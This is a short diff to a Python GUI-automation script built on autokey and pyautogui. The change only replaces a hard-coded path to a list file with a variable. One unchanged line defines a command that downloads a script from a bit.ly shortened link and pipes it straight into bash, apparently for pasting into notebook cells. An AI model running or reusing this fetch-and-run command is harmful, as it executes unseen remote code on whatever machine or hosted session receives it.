@@ -4,7 +4,7 @@ from autokey import *
 import pyautogui
 
 col_cmd="!wget -q -O - bit.ly/cpu02 | bash"
-
+listfile= '/home/one/gids.txt'
 
 global_slow_motion=1
 ##################### Functions ###################################
@@ -223,7 +223,7 @@ debug=0
 
 ### openfiles
 # Using readlines()
-file1 = open('/home/one/gids.txt', 'r')
+file1 = open(listfile, 'r')
 Lines = file1.readlines()
  
 count = 0
